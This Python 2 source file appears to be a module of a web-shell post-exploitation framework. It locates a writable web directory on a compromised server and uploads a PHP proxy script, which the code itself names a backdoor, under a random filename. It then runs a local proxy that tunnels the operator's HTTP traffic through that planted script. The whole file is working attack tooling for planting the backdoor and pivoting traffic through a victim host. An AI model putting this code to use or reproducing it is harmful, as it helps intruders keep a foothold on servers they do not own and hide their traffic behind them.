'''
Created on 20/set/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector as V
from core.parameters import ParametersList, Parameter as P
from core.http.request import agents
from random import choice
from string import letters
import re
from urlparse import urlparse

import SocketServer
import urllib
import sys
from threading import Thread

from random import choice

classname = 'Proxy'


class ProxyHandler(SocketServer.StreamRequestHandler):
    
    allow_reuse_address = 1

    def __init__(self, request, client_address, server):
        
        self.proxies = {}
        self.useragent = choice(agents)
        self.phpproxy = server.rurl
        
        SocketServer.StreamRequestHandler.__init__(self, request, client_address,server)
        
        
    def handle(self):
        req, body, cl, req_len, read_len = '', 0, 0, 0, 4096
        try:
            while 1:
                if not body:
                    line = self.rfile.readline(read_len)
                    if line == '':                                 
                        # send it anyway..
                        self.send_req(req)
                        return
                    #if line[0:17].lower() == 'proxy-connection:':
                    #    req += "Connection: close\r\n"
                    #    continue
                    req += line
                    if not cl:
                        t = re.compile('^Content-Length: (\d+)', re.I).search(line)
                        if t is not None:
                            cl = int(t.group(1))
                            continue
                    if line == "\015\012" or line == "\012":
                        if not cl:
                            self.send_req(req)
                            return
                        else:
                            body = 1
                            read_len = cl
                else:
                    buf = self.rfile.read(read_len)
                    req += buf
                    req_len += len(buf)
                    read_len = cl - req_len
                    if req_len >= cl:
                        self.send_req(req)
                        return
        except IOError:
            return

    def send_req(self, req):
        #print req
        if req == '':
            return
        ua = urllib.FancyURLopener(self.proxies)
        ua.addheaders = [('User-Agent', self.useragent)]
        r = ua.open(self.phpproxy, urllib.urlencode({'req': req}))
        while 1:
            c = r.read(2048)
            if c == '': break
            self.wfile.write(c)
        self.wfile.close()






    
class Proxy(Module):

    params = ParametersList('Install and run real proxy through target', [],
                    P(arg='rpath', help='Upload proxy script to web accessible path (ends with \'.php\')'),
                    P(arg='rurl', help='Run directly proxy server using uploaded proxy script HTTP url'),
                    P(arg='finddir', help='Install proxy script automatically starting from web accessible dir', default='.'),
                    P(arg='lport', help='Local proxy port', default=8080, type=int),
                    )
    

    def __get_backdoor(self):
        
        backdoor_path = 'modules/net/external/proxy.php'

        try:
            f = open(backdoor_path)
        except IOError:
            raise ModuleException(self.name,  "'%s' not found" % backdoor_path)
             
        return f.read()   
        
    def __upload_file_content(self, content, rpath):
        self.modhandler.load('file.upload').set_file_content(content)
        response = self.modhandler.load('file.upload').run({ 'lpath' : 'fake', 'rpath' : rpath, 'chunksize': 256 })
        
        return response
        
    def __find_writable_dir(self, path = 'find'):
        
        self.modhandler.set_verbosity(6)
        
        self.modhandler.load('find.webdir').run({ 'rpath' : path })
        
        url = self.modhandler.load('find.webdir').found_url
        dir = self.modhandler.load('find.webdir').found_dir
        
        self.modhandler.set_verbosity()
        
        return dir, url
        
    
    def __run_proxy_server(self, rurl, lport, lhost='127.0.0.1'):
        
        server = SocketServer.ThreadingTCPServer((lhost, lport), ProxyHandler)
        server.rurl = rurl
        print '[%s] Proxy running. Set \'http://%s:%i\' in your favourite HTTP proxy' % (self.name, lhost, lport)
        server.serve_forever()
        
        
    def run_module(self, rpath, rurl, finddir, lport):

        rname = ''.join(choice(letters) for i in xrange(4)) + '.php'


        if not rurl:
    
            if not rpath and finddir:
                path, url = self.__find_writable_dir(finddir)
                if not (path and url):
                    raise ModuleException(self.name, 'Writable dir in \'%s\' not found. Specify writable dir using \':net.php_proxy rpath=writable_dir/proxy.php\'' % finddir)
                else:
                    path = path + rname
                    url = url + rname
            else:
                if not rpath.endswith('.php'):
                    raise ModuleException(self.name, 'Remote PHP path must ends with \'.php\'')
                path = rpath
                url = None
            
        
            if path:
    
                phpfile = self.__get_backdoor()
                response = self.__upload_file_content(phpfile, path)
            
                if response:
                    
                    if url:
                        self.mprint('[%s] Proxy uploaded, launch \':net.proxy rurl=%s\'' % (self.name, url))
                    else:
                        self.mprint('[%s] Proxy uploaded, launch \':net.proxy rurl=http://\' followed by uploaded script url' % (self.name))

                    self.mprint('[%s] When finished remove script \'%s\'' % (self.name, path))
                
                    
            else:
                raise ModuleException(self.name,  "Error installing remote PHP proxy, check uploading path")
        
        
        else:
            
            try:
                self.__run_proxy_server(rurl, lport)
            except Exception, e:
                raise ModuleException(self.name,'Proxy start on port %i failed with error %s' % (lport, str(e)) )
        
        
        
